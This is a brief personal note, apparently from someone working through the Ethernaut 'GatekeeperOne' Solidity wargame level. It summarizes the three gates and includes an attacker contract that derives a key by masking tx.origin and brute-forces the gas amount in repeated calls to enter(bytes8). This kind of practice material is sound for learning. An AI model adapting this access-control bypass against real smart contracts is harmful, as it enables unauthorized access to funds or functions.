gate one: feed transaction through another address (smart contract)
gate two: ensure gasleft() is an integer multiple of 8191
gate three: some sort of encoding 

Had to cheat to find the answer to gate 3. I need to learn more about 
obscuring bytes / byte operations. I'm trying to brute force gate two
with this contract, returning a valid gas limit:

contract GateKeeper {
    GatekeeperOne gate = GatekeeperOne([levelInstanceAddress]);
    function crack(uint _gas) public returns(uint) {
        bytes8 key = bytes8(bytes20(tx.origin)) & 0xFFFFFFFF0000FFFF;
        for (uint i = _gas; i<(_gas+50); i++) {
            (bool success, ) = address(gate).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                return i;
            }
        }
    }
}
